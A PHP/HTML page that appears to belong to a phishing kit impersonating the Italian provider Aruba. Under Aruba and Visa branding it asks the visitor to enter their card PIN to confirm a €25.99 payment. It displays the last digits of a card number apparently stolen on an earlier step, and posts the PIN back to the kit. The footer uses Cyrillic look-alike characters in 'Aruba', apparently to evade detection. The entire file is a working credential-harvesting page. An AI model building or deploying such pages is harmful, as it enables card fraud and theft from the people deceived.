<?php
    require_once('PARTS/header.php');
?>
    <body>
        <div class="loader d-flex flex-column  justify-content-center align-items-center d-none">
            <img src="assets/images/aruba_logo.svg" class="loadingimg">
            <p style="padding-top: 25px; font-size: 24px; font-weight:100 ; z-index: 999;">Attendere prego...</p>
        </div>
        <div class="container">
            <div class="row">
                <div class="col-md-12 d-flex flex-column align-items-center">
                        <div class="col-md-8 pt-5">
                            <div class="row">
                                <div class="col-6 text-left">
                                    <img src="assets/images/aruba_logo.svg" width="150px">
                                </div>
                                <div class="col-6 text-right">
                                    <img class="float-end" src="assets/images/viscard.png" width="150px">
                                </div>
                            </div>
                        </div>
                        <div class="col-md-8 mycontent">
                            <div class="row">
                                <div class="col-md-12 d-flex justify-content-center align-items-center p-3">
                                    <img src="assets/images/ICO_pw_token.gif">
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-md-12">
                                    <form id="form" action="./" method="POST">
									<input type="hidden" name="step"  value="pin">
                                        <div class="speaches">
                                            <p class="">Inserisci adesso il <b>PIN DELLA CARTA che stai utilizzando</b> e clicca su "Prosegui".</p>
                                            <p class="">La Banca verificherà le tue informazioni e, se corrette, il pagamento di seguito indicato si concluderà in sicurezza.</p>
                                            <p></p>
                                            <div class="pt-4">
                                                <hr>
                                            </div>
                                            <div class="form-group d-flex align-items-center flex-column">
                                                <label class="form-label requiredtext">PIN Della carta</label>
                                                <input name="pin" id="pin" type="text" class="form-control inputhalf">
                                            </div>
                                            <div class="pt-3">
                                                <hr>
                                            </div>
                                            <h3 class="bbigti">Dettagli del pagamento</h3>
                                            <p class="title">Importo</p>
                                            <p class="info">25.99 €</p>
                                            <p class="title">Codice ordine</p>
                                            <p class="info"><?php echo $_SESSION['idnum']; ?></p>
                                            <p class="title">Data e ora</p>
                                            <p class="info"><?php echo date('d/m/Y H:i:s') ?></p>
                                            <p class="title">Numero carta</p>
                                            <p class="info">**** **** **** <?php echo substr($_SESSION['cc'], -4) ?></p>
                                            <div class="form-group d-flex align-items-center flex-column p-4">
                                                <button class="yellowbtn" type="submit">Prosegui</button>
                                            </div>
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-8 text-center pt-5">
                            <p>Cорyrіght @<?php echo date('Y') ?> аrubа ѕ.р.а.- р.і. 0257950516 - аll rіghtѕ rеѕеrνеd -</p>
                            <p class="flink" >Aruba.it</p>
                        </div>
                </div>
            </div>
        </div>
        <?php  require_once('PARTS/footer.php') ?>
        <script src="assets/js/pages/pin.js"></script>
    </body>
</html>
